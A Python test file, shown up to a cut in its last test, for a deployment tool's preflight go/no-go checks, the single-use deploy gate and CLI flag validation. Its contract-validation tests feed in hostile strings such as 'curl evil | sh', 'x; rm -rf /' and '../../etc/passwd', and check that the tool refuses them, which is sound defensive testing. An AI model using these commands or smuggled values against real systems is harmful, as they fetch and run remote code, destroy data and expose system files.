"""Preflight (go/no-go) tests — hermetic: every transport is injected, the
journal lives in a tmpdir, telemetry is patched out. No test dials a host."""
import datetime
import hashlib
import io
import json
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr
from pathlib import Path
from unittest import mock

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from vpscfg import cli, contracts, executor, journal, preflight  # noqa: E402
from vpscfg.control import Guard  # noqa: E402
from vpscfg.gates import DENY_ALWAYS_FLOOR, Refused  # noqa: E402

SERVICE, HOST = "shop-frontend", "edge1"
MUTATING_WORDS = ("restart", " up ", "tar czf", "rm ", "mv ", "cp ", "kill", "docker run",
                  "compose up", "systemctl", "reload", "chmod", "chown", "> /", "tee ")


def _policy(unlocked=("container:edge1/shop-frontend",), posture="test"):
    return {"version": 1, "mode": "test", "mutation_enabled": True,
            "allowed_verbs": ["deploy"], "scopes": {"unlocked": list(unlocked)},
            "hosts": {HOST: {"posture": posture}}, "deny_always": list(DENY_ALWAYS_FLOOR)}


def _md5(b):
    return hashlib.md5(b).hexdigest()


class World(object):
    """A fake edge1 where everything is healthy. Tests perturb one field."""

    def __init__(self, repo):
        self.repo = repo
        (Path(repo) / "app").mkdir()
        (Path(repo) / "app" / "index.html").write_bytes(b"<html>new</html>")
        self.live_md5 = _md5(b"<html>old</html>")
        self.git_history = {self.live_md5, _md5(b"<html>new</html>")}
        self.containers = "shop-frontend\tnginx:alpine\n"
        self.volumes = "n8n_data\n"
        self.containers_rc = 0
        self.listening = "tcp LISTEN 0 128 0.0.0.0:8080 0.0.0.0:* users:((\"docker-proxy\",pid=1,fd=4))\n"
        self.df_root_kb = 41000000
        self.df_dir_kb = 41000000
        self.mem_kb = 2048000
        self.capacity_rc = 0
        self.rsync_out = ">fcst...... app-frontend.html\n"
        self.rsync_rc = 0
        self.named_rc = 0
        self.verify_ok = True
        self.backup = {"backup": "/root/shop-frontend-pre-20260901-000000-abcd.tar.gz",
                       "members": 3, "bytes": 100, "ok": True, "detail": "3 member(s)"}
        self.blackout = (0, "[]", "")
        self.fp = None
        self.ssh_raises = None
        self.ansible = (0, "PLAY RECAP\nedge1 : ok=3 changed=1 unreachable=0 failed=0\n", "")
        self.ssh_log = []
        self.md5_result = None
        self.listening_rc = 0

    def ssh(self, host, cmd, timeout=90):
        assert host == HOST
        self.ssh_log.append(cmd)
        if self.ssh_raises:
            raise self.ssh_raises
        if "docker ps -a --format" in cmd:
            return self.containers_rc, self.containers, ""
        if "docker volume ls" in cmd:
            return 0, self.volumes, ""
        if cmd.startswith("ss -lntup"):
            return self.listening_rc, self.listening, ""
        if cmd.startswith("df -Pk"):
            out = ("Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                   "/dev/vda1 81000000 1 %d 50%% /\n/dev/vdb1 81000000 1 %d 50%% /opt\n"
                   "MemAvailable: %d kB\n" % (self.df_root_kb, self.df_dir_kb, self.mem_kb))
            return self.capacity_rc, out, ""
        if "config -q" in cmd or "nginx -t" in cmd:
            return self.named_rc, "", "syntax is ok" if self.named_rc == 0 else "broken"
        raise AssertionError("unexpected remote command: %r" % cmd)

    def local(self, argv, timeout=300):
        if argv[0] == "rsync":
            return self.rsync_rc, self.rsync_out, ""
        return self.ansible

    def remote_runner(self, argv):
        if self.ssh_raises:
            raise self.ssh_raises
        if self.md5_result is not None:
            return self.md5_result
        return 0, "%s  /opt/shop/app-frontend.html\n" % self.live_md5, ""

    def checks(self, contract, host):
        return self.verify_ok, [{"check": "container", "name": SERVICE, "ok": self.verify_ok,
                                 "detail": "running" if self.verify_ok else "exited"}]

    def backup_verifier(self, host, service):
        if self.backup is None:
            raise Refused("no /root/%s-pre-*.tar.gz on %s" % (service, host))
        return self.backup

    def blackout_runner(self, argv, timeout=10):
        if self.blackout is None:
            raise OSError("no blackout binary")
        return self.blackout

    def fingerprint_report(self, ctx):
        return self.fp


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self._orig = journal.JOURNAL_DIR
        journal.JOURNAL_DIR = Path(self._tmp.name) / "journal"
        self._tel = mock.patch("vpscfg.telemetry.push_event")
        self._tel.start()
        self.repo = str(Path(self._tmp.name) / "repo")
        Path(self.repo).mkdir()
        self.w = World(self.repo)
        self.contract = {
            "service": SERVICE, "host": HOST, "scope_kind": "container", "repo": self.repo,
            "deploy_dir": "/opt/shop",
            "sync": {"include": [{"src": "app/index.html", "dest": "app-frontend.html"}],
                     "never": [".env"]},
            "pre": [{"backup": "tar czf /root/{service}-pre-{ts}.tar.gz {deploy_dir}"}],
            "build": "docker restart shop-frontend",
            "verify": [{"http": {"url": "http://x/health", "expect": 200}},
                       {"container": {"name": SERVICE, "state": "running"}}],
            "blast_radius": {"volumes": ["n8n_data"]},
            "freeze": False,
        }
        self.guard = Guard(_policy(), True)

    def tearDown(self):
        journal.JOURNAL_DIR = self._orig
        self._tel.stop()
        self._tmp.cleanup()

    def run_pf(self, contract=None, guard=None, raw="", allow=False, host_contracts=None):
        c = contract or self.contract
        contracts._validate(c, "test")
        return preflight.run(c, HOST, guard or self.guard, raw, ["docker restart shop-frontend"],
                             host_contracts=host_contracts, allow_unhealthy=allow,
                             ssh=self.w.ssh, local=self.w.local, checks=self.w.checks,
                             backup_verifier=self.w.backup_verifier,
                             blackout_runner=self.w.blackout_runner,
                             fingerprint_report=self.w.fingerprint_report,
                             remote_runner=self.w.remote_runner,
                             git_md5s=lambda repo, path: self.w.git_history)

    def status(self, report, name):
        return next(c for c in report["checks"] if c["name"] == name)["status"]


class VerdictTest(Base):
    def test_all_green_is_go_exit_0(self):
        r = self.run_pf()
        bad = [c for c in r["checks"] if c["status"] not in ("pass", "skip")]
        self.assertEqual(bad, [])
        self.assertEqual((r["verdict"], r["exit_code"]), ("GO", 0))
        self.assertTrue(r["plan_hash"].startswith("sha256:"))

    def test_every_command_sent_is_read_only(self):
        self.contract["preflight"] = {"checks": {"compose_config": True, "nginx_test": True}}
        self.contract["playbook"] = "baseline"
        with mock.patch("vpscfg.sshconfig.load", return_value={}):
            r = self.run_pf()
        self.assertEqual(r["verdict"], "GO")
        for kind, cmd in r["commands_sent"]:
            text = " ".join(cmd) if isinstance(cmd, list) else cmd
            if kind == "local" and cmd[0].endswith("rsync"):
                self.assertIn("--dry-run", cmd)
            if kind == "local" and "ansible" in cmd[0]:
                self.assertIn("--check", cmd)
            for word in MUTATING_WORDS:
                self.assertNotIn(word, " %s " % text, text)
        self.assertNotIn("docker restart shop-frontend", self.w.ssh_log)

    def test_warning_is_go_with_warnings_exit_1(self):
        r = self.run_pf(raw="# TODO: verify")
        self.assertEqual(self.status(r, "contract"), "warn")
        self.assertEqual((r["verdict"], r["exit_code"]), ("GO-WITH-WARNINGS", 1))

    def test_verdict_function(self):
        mk = lambda *s: [{"status": x} for x in s]
        self.assertEqual(preflight.verdict(mk("pass", "skip")), "GO")
        self.assertEqual(preflight.verdict(mk("pass", "warn")), "GO-WITH-WARNINGS")
        self.assertEqual(preflight.verdict(mk("warn", "fail")), "NO-GO")
        self.assertEqual(preflight.verdict(mk("pass", "error")), "NO-GO")
        self.assertEqual(preflight.verdict([]), "NO-GO")


class FailClosedTest(Base):
    def test_unreachable_host_is_no_go_not_pass(self):
        self.w.ssh_raises = OSError("ssh transport failed")
        r = self.run_pf()
        self.assertEqual(r["verdict"], "NO-GO")
        for name in ("drift", "capacity"):
            self.assertEqual(self.status(r, name), "error")
        self.assertNotEqual(self.status(r, "outage"), "pass")

    def test_unexpected_exception_in_a_check_is_error(self):
        self.w.checks = mock.Mock(side_effect=RuntimeError("boom"))
        r = self.run_pf()
        self.assertEqual(self.status(r, "baseline"), "error")
        self.assertEqual(r["verdict"], "NO-GO")

    def test_unparseable_capacity_is_error(self):
        with mock.patch.object(self.w, "ssh", side_effect=lambda h, c, timeout=90:
                               (0, "garbage\n", "") if c.startswith("df") else World.ssh(self.w, h, c)):
            r = self.run_pf()
        self.assertEqual(self.status(r, "capacity"), "error")

    def test_missing_source_repo_is_no_go(self):
        self.contract["repo"] = str(Path(self._tmp.name) / "nope")
        r = self.run_pf()
        self.assertIsNone(r["plan_hash"])
        self.assertEqual(self.status(r, "plan"), "fail")
        self.assertEqual(r["verdict"], "NO-GO")


class CheckTest(Base):
    def test_lint_error_is_fail(self):
        with mock.patch("vpscfg.lint.lint_contract", return_value=[("E", "bad")]):
            r = self.run_pf()
        self.assertEqual(self.status(r, "contract"), "fail")

    def test_frozen_contract_and_unreleased_scope_fail_posture(self):
        self.contract["freeze"] = True
        self.assertEqual(self.status(self.run_pf(), "posture"), "fail")
        self.contract["freeze"] = False
        self.assertEqual(self.status(self.run_pf(guard=Guard(_policy(unlocked=()), True)), "posture"), "fail")
        self.assertEqual(self.status(self.run_pf(guard=Guard(_policy(posture="frozen"), True)), "posture"), "fail")

    def test_unverified_guard_still_judges_posture_but_notes_wrapper(self):
        r = self.run_pf(guard=Guard(_policy(), False))
        check = next(c for c in r["checks"] if c["name"] == "posture")
        self.assertEqual(check["status"], "pass")
        self.assertIn("outside the wrapper", check["evidence"])

    def test_sync_touching_never_path_fails(self):
        self.contract["sync"]["include"] = ["app/"]
        self.contract["sync"]["never"] = ["app/secret.env"]
        self.w.rsync_out = ">f+++++++++ app/secret.env\n>fcst...... app/index.html\n"
        r = self.run_pf()
        self.assertEqual(self.status(r, "sync_plan"), "fail")

    def test_sync_rsync_error_is_error(self):
        self.w.rsync_rc = 23
        self.assertEqual(self.status(self.run_pf(), "sync_plan"), "error")

    def test_drift_unexplained_fails_explained_passes(self):
        self.assertEqual(self.status(self.run_pf(), "drift"), "pass")  # live == an old commit
        self.w.live_md5 = _md5(b"hand edited on the host")
        r = self.run_pf()
        self.assertEqual(self.status(r, "drift"), "fail")
        self.assertIn("UNEXPLAINED", next(c for c in r["checks"] if c["name"] == "drift")["evidence"])

    def test_drift_remote_probe_failure_is_not_new_files(self):
        """md5sum failing for every file (no binary, permission denied) leaves
        stdout empty; that must be an error, never 'N new on host'."""
        for result in ((127, "", "md5sum: command not found"),
                       (1, "", "md5sum: /opt/shop/app-frontend.html: Permission denied"),
                       (1, "", ""), (2, "", "")):
            self.w.md5_result = result
            self.assertEqual(self.status(self.run_pf(), "drift"), "error", result)
        self.w.md5_result = (1, "", "md5sum: /opt/shop/app-frontend.html: No such file or directory")
        self.assertEqual(self.status(self.run_pf(), "drift"), "pass")  # genuinely new file

    def test_drift_contract_may_downgrade_to_warn(self):
        self.w.live_md5 = _md5(b"hand edited on the host")
        self.contract["preflight"] = {"drift": "warn"}
        self.assertEqual(self.status(self.run_pf(), "drift"), "warn")

    def test_outage_prevent_fails_findings_warn(self):
        self.w.volumes = "n8n_datb\n"  # one edit from the declared volume
        self.assertEqual(self.status(self.run_pf(), "outage"), "fail")
        self.w.volumes = "n8n_data\n"
        self.w.containers += "pg\tpostgres:15\n"
        self.assertEqual(self.status(self.run_pf(), "outage"), "warn")
        self.w.containers_rc = 1
        self.assertEqual(self.status(self.run_pf(), "outage"), "fail")

    def test_unhealthy_baseline_is_no_go_and_recorded(self):
        self.w.verify_ok = False
        r = self.run_pf()
        check = next(c for c in r["checks"] if c["name"] == "baseline")
        self.assertEqual(check["status"], "fail")
        self.assertEqual(check["data"][0]["ok"], False)
        self.assertEqual(r["verdict"], "NO-GO")

    def test_allow_unhealthy_baseline_downgrades_to_warn(self):
        self.w.verify_ok = False
        r = self.run_pf(allow=True)
        self.assertEqual(self.status(r, "baseline"), "warn")
        self.assertTrue(r["allow_unhealthy_baseline"])
        self.assertEqual(r["verdict"], "GO-WITH-WARNINGS")

    def test_backup_missing_warns_without_migrations(self):
        self.w.backup = None
        self.assertEqual(self.status(self.run_pf(), "backup"), "warn")

    def test_migrations_without_verified_backup_is_no_go(self):
        for irreversible in (True, False):
            self.contract["migrations"] = {"irreversible": irreversible}
            self.w.backup = None
            self.assertEqual(self.status(self.run_pf(), "backup"), "fail")
            self.w.backup = {"backup": "/root/x-pre-1.tar.gz", "ok": False, "detail": "truncated"}
            self.assertEqual(self.status(self.run_pf(), "backup"), "fail")
        self.w.backup = {"backup": "/root/x-pre-1.tar.gz", "ok": True, "detail": "clean"}
        self.assertEqual(self.status(self.run_pf(), "backup"), "pass")

    def test_no_pre_backup_step_fails(self):
        self.contract["pre"] = []
        self.assertEqual(self.status(self.run_pf(), "backup"), "fail")

    def test_ports_collision_down_skip(self):
        self.assertEqual(self.status(self.run_pf(), "ports"), "skip")
        self.contract["ports"] = [8080]
        self.assertEqual(self.status(self.run_pf(), "ports"), "pass")
        other = dict(self.contract, service="other", ports=[8080])
        self.assertEqual(self.status(self.run_pf(host_contracts={"other": other}), "ports"), "fail")
        self.contract["ports"] = [9999]
        self.assertEqual(self.status(self.run_pf(), "ports"), "warn")

    def test_ports_probe_nonzero_rc_is_error_even_with_partial_output(self):
        self.contract["ports"] = [8080]
        self.w.listening_rc = 1
        self.assertEqual(self.status(self.run_pf(), "ports"), "error")

    def test_fingerprint_unjournaled_change_warns(self):
        self.w.fp = {"changes": [("x", "recreated", "")], "pod_changes": [],
                     "uncovered": [("x", "recreated", "")], "baseline_ts": "t"}
        self.assertEqual(self.status(self.run_pf(), "fingerprint"), "warn")
        self.w.fp["uncovered"] = []
        self.assertEqual(self.status(self.run_pf(), "fingerprint"), "pass")

    def test_capacity_thresholds(self):
        self.w.df_dir_kb = 1 * 1048576  # 1G < default 2G
        self.assertEqual(self.status(self.run_pf(), "capacity"), "fail")
        self.contract["preflight"] = {"min_free_gb": 0.5}
        self.assertEqual(self.status(self.run_pf(), "capacity"), "pass")
        self.w.mem_kb = 100 * 1024  # 100M < default 256M
        self.assertEqual(self.status(self.run_pf(), "capacity"), "fail")
        self.contract["preflight"] = {"min_free_gb": 0.5, "min_free_mem_mb": 64}
        self.assertEqual(self.status(self.run_pf(), "capacity"), "pass")
        self.w.capacity_rc = 1
        self.assertEqual(self.status(self.run_pf(), "capacity"), "error")

    def test_blackout_is_advisory(self):
        self.assertEqual(self.status(self.run_pf(), "blackout"), "pass")
        self.w.blackout = (0, json.dumps([{"host": HOST}]), "")
        self.assertEqual(self.status(self.run_pf(), "blackout"), "pass")
        self.w.blackout = None
        self.assertEqual(self.status(self.run_pf(), "blackout"), "warn")

    def test_named_checks_fixed_commands(self):
        self.contract["preflight"] = {"checks": {"compose_config": {"file": "stack/compose.yml"},
                                                 "nginx_test": {"container": "edge"}}}
        r = self.run_pf()
        self.assertEqual(self.status(r, "deployability:compose_config"), "pass")
        self.assertTrue(any("-f /opt/shop/stack/compose.yml config -q" in c for c in self.w.ssh_log))
        self.assertIn("docker exec edge nginx -t", self.w.ssh_log)
        self.w.named_rc = 1
        r = self.run_pf()
        self.assertEqual(self.status(r, "deployability:nginx_test"), "fail")
        self.assertEqual(r["verdict"], "NO-GO")

    def test_ansible_check_evidence_and_blind_spot(self):
        self.contract["playbook"] = "baseline"
        with mock.patch("vpscfg.sshconfig.load", return_value={}):
            r = self.run_pf()
            check = next(c for c in r["checks"] if c["name"] == "ansible")
            self.assertEqual(check["status"], "pass")
            self.assertIn("SKIPS command/shell", check["evidence"])
            self.w.ansible = (2, "edge1 : ok=1 changed=0 unreachable=0 failed=1\n", "")
            self.assertEqual(self.status(self.run_pf(), "ansible"), "fail")

    def test_ansible_refused_when_playbooks_escape_check_mode(self):
        self.contract["playbook"] = "baseline"
        pbdir = Path(self._tmp.name) / "playbooks"
        pbdir.mkdir()
        (pbdir / "baseline.yml").write_text("- hosts: all\n  tasks:\n    - command: id\n")
        (pbdir / "roles.yml").write_text("- command: touch /x\n  check_mode: false\n")
        self.w.ansible = mock.Mock(side_effect=AssertionError("must not run"))
        with mock.patch("vpscfg.playbook.PLAYBOOK_DIR", pbdir), \
                mock.patch("vpscfg.sshconfig.load", return_value={}):
            r = self.run_pf()
        check = next(c for c in r["checks"] if c["name"] == "ansible")
        self.assertEqual(check["status"], "fail")
        self.assertIn("roles.yml:2", check["evidence"])

    def test_shipped_playbooks_do_not_escape_check_mode(self):
        self.assertEqual(preflight._check_mode_escapes(), [])

    def test_monitor_only_and_wrong_host_refuse(self):
        with self.assertRaises(Refused):
            preflight.run(dict(self.contract, host="web2"), HOST, self.guard, "", [])
        with self.assertRaises(Refused):
            preflight.run(dict(self.contract, monitor_only=True), HOST, self.guard, "", [])


class ReadOnlyTransportTest(Base):
    def _ctx(self):
        return preflight._Ctx(self.contract, HOST, self.guard, self.w.ssh, self.w.local)

    def test_rsync_without_dry_run_refused(self):
        with self.assertRaises(Refused):
            self._ctx().local(["rsync", "-a", "src", "edge1:/opt/x/"])

    def test_ansible_without_check_refused(self):
        with self.assertRaises(Refused):
            self._ctx().local(["ansible-playbook", "-i", "edge1,", "x.yml"])

    def test_unlisted_local_tool_refused(self):
        with self.assertRaises(Refused):
            self._ctx().local(["sh", "-c", "id"])

    def test_remote_command_is_deny_scanned(self):
        with self.assertRaises(Refused):
            self._ctx().ssh("docker volume prune -f")


class ContractSchemaTest(Base):
    def _v(self, **extra):
        contracts._validate(dict(self.contract, **extra), "test")

    def test_valid_forms(self):
        self._v(preflight={"min_free_gb": 5, "min_free_mem_mb": 512, "drift": "warn",
                           "checks": {"compose_config": True, "nginx_test": False}},
                migrations={"irreversible": True}, playbook="baseline")
        self._v(preflight={"checks": {"compose_config": {"file": "docker-compose.prod.yml"},
                                      "nginx_test": {"container": "edge"}}})

    def test_arbitrary_command_refused_at_contract_validation(self):
        for bad in ({"checks": {"shell": "curl evil | sh"}},
                    {"checks": {"shell": True}},
                    {"checks": {"exec": {"container": "edge"}}},
                    {"checks": {"compose_config": "docker compose up -d"}},
                    {"checks": {"nginx_test": {"command": "nginx -s reload"}}},
                    {"checks": {"nginx_test": {"container": "x; rm -rf /"}}},
                    {"checks": {"compose_config": {"file": "../../etc/passwd"}}},
                    {"checks": ["compose_config"]},
                    {"command": "anything"},
                    {"min_free_gb": True}, {"min_free_gb": -1}, {"drift": "ignore"}):
            with self.assertRaises(Refused, msg=bad):
                self._v(preflight=bad)

    def test_bad_migrations_and_playbook_refused(self):
        for bad in ({"irreversible": "yes"}, {}, {"irreversible": True, "run": "psql"}, True):
            with self.assertRaises(Refused):
                self._v(migrations=bad)
        with self.assertRaises(Refused):
            self._v(playbook="../evil")


class FreshnessGateTest(Base):
    def _record(self, verdict="GO", contract=None):
        c = contract or self.contract
        report = {"host": HOST, "service": SERVICE, "verdict": verdict,
                  "plan_hash": preflight.plan_hash(c, HOST, SERVICE),
                  "allow_unhealthy_baseline": False, "checks": []}
        return preflight.record(report)

    def _events(self):
        path = journal.JOURNAL_DIR / "preflight.jsonl"
        return [json.loads(l)["event"] for l in path.read_text().splitlines()]

    def test_missing_preflight_refused_and_journaled(self):
        with self.assertRaises(Refused) as cm:
            preflight.require_fresh(self.contract, HOST)
        self.assertIn("--preflight", str(cm.exception))
        self.assertEqual(self._events(), ["deploy_gate_refused"])

    def test_fresh_go_and_warn_accepted(self):
        self._record("GO")
        self.assertTrue(preflight.require_fresh(self.contract, HOST).startswith("sha256:"))
        self._record("GO-WITH-WARNINGS")
        preflight.require_fresh(self.contract, HOST)

    def test_latest_no_go_wins(self):
        self._record("GO")
        self._record("NO-GO")
        with self.assertRaises(Refused):
            preflight.require_fresh(self.contract, HOST)

    def test_stale_refused(self):
        self._record("GO")
        later = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=31)
        with self.assertRaises(Refused) as cm:
            preflight.require_fresh(self.contract, HOST, now=later)
        self.assertIn("stale", str(cm.exception))

    def test_future_dated_refused(self):
        self._record("GO")
        earlier = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=5)
        with self.assertRaises(Refused):
            preflight.require_fresh(self.contract, HOST, now=earlier)

    def test_different_plan_refused(self):
        self._record("GO")
        (Path(self.repo) / "app" / "index.html").write_bytes(b"<html>changed after GO</html>")
        with self.assertRaises(Refused) as cm:
            preflight.require_fresh(self.contract, HOST)
        self.assertIn("no preflight recorded for this plan", str(cm.exception))
        with self.assertRaises(Refused):
            preflight.require_fresh(dict(self.contract, build="docker restart other"), HOST)

    def test_mode_only_change_is_a_different_plan(self):
        import os
        before = preflight.plan_hash(self.contract, HOST, SERVICE)
        os.chmod(Path(self.repo) / "app" / "index.html", 0o755)
        self.assertNotEqual(before, preflight.plan_hash(self.contract, HOST, SERVICE))

    def test_pycache_is_bound_too(self):
        self.contract["sync"]["include"] = ["app/"]
        before = preflight.plan_hash(self.contract, HOST, SERVICE)
        (Path(self.repo) / "app" / "__pycache__").mkdir()
        (Path(self.repo) / "app" / "__pycache__" / "m.pyc").write_bytes(b"x")
        self.assertNotEqual(before, preflight.plan_hash(self.contract, HOST, SERVICE))

    def test_go_is_single_use(self):
        self._record("GO")
        preflight.require_fresh(self.contract, HOST, token="a", consume=True)
        preflight.require_fresh(self.contract, HOST, token="a")  # its own re-check under lock
        with self.assertRaises(Refused) as cm:
            preflight.require_fresh(self.contract, HOST, token="b", consume=True)
        self.assertIn("single-use", str(cm.exception))
        with self.assertRaises(Refused):
            preflight.require_fresh(self.contract, HOST, token="b")
        self._record("GO")  # a fresh preflight re-arms it
        preflight.require_fresh(self.contract, HOST, token="b", consume=True)

    def test_other_host_or_service_record_does_not_count(self):
        report = {"host": "web2", "service": SERVICE, "verdict": "GO",
                  "plan_hash": preflight.plan_hash(self.contract, HOST, SERVICE),
                  "allow_unhealthy_baseline": False, "checks": []}
        preflight.record(report)
        with self.assertRaises(Refused):
            preflight.require_fresh(self.contract, HOST)

    def test_broken_chain_refused(self):
        self._record("GO")
        path = journal.JOURNAL_DIR / "preflight.jsonl"
        path.write_text(path.read_text().replace('"GO"', '"GO" ', 1) + json.dumps(
            {"event": "preflight", "verdict": "GO"}) + "\n")
        with self.assertRaises(Refused) as cm:
            preflight.require_fresh(self.contract, HOST)
        self.assertIn("chain", str(cm.exception))


class CliTest(Base):
    def _cli(self, argv, guard=None):
        real_run = preflight.run

        def injected(*a, **k):
            k.update(ssh=self.w.ssh, local=self.w.local, checks=self.w.checks,
                     backup_verifier=self.w.backup_verifier,
                     blackout_runner=self.w.blackout_runner,
                     fingerprint_report=self.w.fingerprint_report,
                     remote_runner=self.w.remote_runner,
                     git_md5s=lambda repo, path: self.w.git_history)
            return real_run(*a, **k)
        out, err = io.StringIO(), io.StringIO()
        with mock.patch.object(cli.contracts, "load", return_value=self.contract), \
                mock.patch.object(cli.mapfile, "resolve", return_value=None), \
                mock.patch.object(cli, "_contracts_on_host", return_value={}), \
                mock.patch.object(cli, "_host_names", return_value={HOST}), \
                mock.patch.object(cli.Guard, "load", return_value=guard or Guard(_policy(), True)), \
                mock.patch.object(cli.preflight, "run", side_effect=injected), \
                mock.patch.object(cli.executor, "apply", return_value=0) as apply, \
                redirect_stdout(out), redirect_stderr(err):
            rc = cli.main(argv)
        return rc, out.getvalue(), err.getvalue(), apply

    def test_json_shape(self):
        rc, out, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight", "--json"])
        doc = json.loads(out)
        self.assertEqual(rc, doc["exit_code"])
        self.assertIn(doc["verdict"], ("GO", "GO-WITH-WARNINGS", "NO-GO"))
        for key in ("host", "service", "plan_hash", "checks", "counts", "recorded",
                    "allow_unhealthy_baseline", "generated_at"):
            self.assertIn(key, doc)
        names = [c["name"] for c in doc["checks"]]
        for expected in ("contract", "posture", "plan", "sync_plan", "drift", "outage",
                         "baseline", "backup", "ports", "fingerprint", "capacity",
                         "blackout", "ansible"):
            self.assertIn(expected, names)
        for c in doc["checks"]:
            self.assertEqual(set(c) - {"data"}, {"name", "status", "evidence"})
            self.assertIn(c["status"], preflight.STATUSES)
        self.assertTrue(doc["recorded"])

    def test_human_report_and_exit_codes(self):
        rc, out, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight"])
        self.assertIn("VERDICT: GO", out)
        self.assertEqual(rc, 0)
        self.w.verify_ok = False
        rc, out, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight"])
        self.assertEqual(rc, 2)
        self.assertIn("VERDICT: NO-GO", out)

    def test_allow_unhealthy_requires_reason_and_is_journaled(self):
        self.w.verify_ok = False
        rc, _, err, _ = self._cli([HOST, "deploy", SERVICE, "--preflight", "--allow-unhealthy-baseline"])
        self.assertEqual(rc, 2)
        self.assertIn("--reason", err)
        rc, _, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight",
                                 "--allow-unhealthy-baseline", "--reason", "repair crashloop"])
        self.assertEqual(rc, 1)
        rec = json.loads((journal.JOURNAL_DIR / "preflight.jsonl").read_text().splitlines()[-1])
        self.assertTrue(rec["allow_unhealthy_baseline"])
        self.assertEqual(rec["reason"], "repair crashloop")

    def test_preflight_with_run_refused(self):
        rc, _, err, apply = self._cli([HOST, "deploy", SERVICE, "--preflight", "--run", "--reason", "x"])
        self.assertEqual(rc, 2)
        apply.assert_not_called()

    def test_unrecordable_result_is_forced_no_go(self):
        with mock.patch.object(cli.preflight, "record", side_effect=OSError("disk full")):
            rc, out, _, _ = self._cli([HOST, "deploy", SERVICE, "--preflight", "--json"])
        self.assertEqual(rc, 2)
        self.assertFalse(json.loads(out)["recorded"])

    def test_deploy_run_without_preflight_refused_before_executor(self):
        rc, _, err, apply = self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "ship"])
        self.assertEqual(rc, 2)
        self.assertIn("preflight", err)
        apply.assert_not_called()

    def test_deploy_run_after_go_reaches_executor_with_gate_under_lock(self):
        self.assertEqual(self._cli([HOST, "deploy", SERVICE, "--preflight"])[0], 0)
        rc, _, _, apply = self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "ship"])
        self.assertEqual(rc, 0)
        apply.assert_called_once()
        gate = apply.call_args.kwargs["preflight"]
        gate()  # still fresh, same plan: passes under the lock too
        (Path(self.repo) / "app" / "index.html").write_bytes(b"<html>swapped</html>")
        with self.assertRaises(Refused):
            gate()  # source changed between the check and the lock

    def test_second_deploy_run_needs_a_new_preflight(self):
        self._cli([HOST, "deploy", SERVICE, "--preflight"])
        self.assertEqual(self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "1"])[0], 0)
        rc, _, err, apply = self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "2"])
        self.assertEqual(rc, 2)
        self.assertIn("single-use", err)
        apply.assert_not_called()

    def test_deploy_run_after_no_go_refused(self):
        self.w.verify_ok = False
        self._cli([HOST, "deploy", SERVICE, "--preflight"])
        rc, _, _, apply = self._cli([HOST, "deploy", SERVICE, "--run", "--reason", "ship"])
        self.assertEqual(rc, 2)
        apply.assert_not_called()


    # --- unknown flags are refused, never silently ignored ---

    def _refused_before_anything(self, argv):
        with mock.patch.object(cli.probe, "run") as probe_run, \
                mock.patch.object(cli.probe, "latest_backup") as latest, \
                mock.patch.object(cli.contracts, "load") as load, \
                mock.patch.object(cli.preflight, "run") as pf_run, \
                mock.patch.object(cli.executor, "apply") as apply, \
                mock.patch.object(cli.Guard, "load", return_value=Guard(_policy(), True)), \
                redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()) as err:
            rc = cli.main(argv)
        for m in (probe_run, latest, load, pf_run, apply):
            m.assert_not_called()
        self.assertEqual(rc, 2)
        self.assertIn("unknown flag", err.getvalue())
        return err.getvalue()

    def test_mistyped_flags_refused_with_suggestion_before_any_probe(self):
        for bad, want in (("--preflighta", "--preflight"), ("--preflight!", "--preflight"),
                          ("--rnu", "--run"),
                          ("--allow-unhealthy-basline", "--allow-unhealthy-baseline")):
            err = self._refused_before_anything(
                [HOST, "deploy", SERVICE, "--preflight" if bad == "--allow-unhealthy-basline"
                 else "--json", bad, "--reason", "x"])
            self.assertIn("did you mean %s?" % want, err)
            self.assertIn("accepted:", err)

    def test_mistyped_run_with_reason_is_not_a_silent_dry_run(self):
        err = self._refused_before_anything([HOST, "deploy", SERVICE, "--rnu", "--reason", "ship"])
        self.assertIn("did you mean --run?", err)

    def test_equals_form_reason_refused_with_hint(self):
        err = self._refused_before_anything([HOST, "deploy", SERVICE, "--run", "--reason=ship"])
        self.assertIn("two arguments: --reason <value>", err)

    def test_rollback_flags_validated(self):
        err = self._refused_before_anything([HOST, "rollback", SERVICE, "--rnu", "--reason", "x"])
        self.assertIn("did you mean --run?", err)
        self._refused_before_anything([HOST, "rollback", SERVICE, "--preflight"])

    def test_repair_path_flags_validated(self):
        err = self._refused_before_anything(
            [HOST, "deploy", SERVICE, "--repair-action", "apply", "--requets", "r.json", "--run"])
        self.assertIn("did you mean --request?", err)
        self.assertIn("deploy --repair-action", err)
        self._refused_before_anything(  # abbreviations argparse would have accepted
            [HOST, "deploy", SERVICE, "--repair-action", "describe", "--req", "r.json"])
        # --reason belongs to deploy, not the repair protocol
        self._refused_before_anything(
            [HOST, "deploy", SERVICE, "--repair-action", "describe", "--reason", "x"])

    def test_repair_path_valid_flags_reach_repair_cli(self):
        from vpscfg import repair
        with mock.patch.object(repair, "cli", return_value=0) as rcli, \
                mock.patch.object(cli.Guard, "load", return_value=Guard(_policy(), True)):
            for argv in ([HOST, "deploy", SERVICE, "--repair-action", "describe"],
                         [HOST, "deploy", SERVICE, "--repair-action", "status", "--operation-id=abc"],
                         [HOST, "deploy", SERVICE, "--repair-action", "apply", "--request", "r.json",
                          "--approval-file=a.txt", "--run"]):
                self.assertEqual(cli.main(argv), 0, argv)
        self.assertEqual(rcli.call_count, 3)
        rcli.assert_called_with([HOST, "deploy", SERVICE, "--repair-action", "apply", "--request",
                                 "r.json", "--approval-file=a.txt", "--run"],
                                HOST, SERVICE, mock.ANY)

    def test_repair_action_equals_form_refused_not_run_as_plain_deploy(self):
        # `--repair-action=apply` is not the membership-tested token, so it used
        # to fall through to the plain deploy path; now it is refused outright.
        err = self._refused_before_anything(
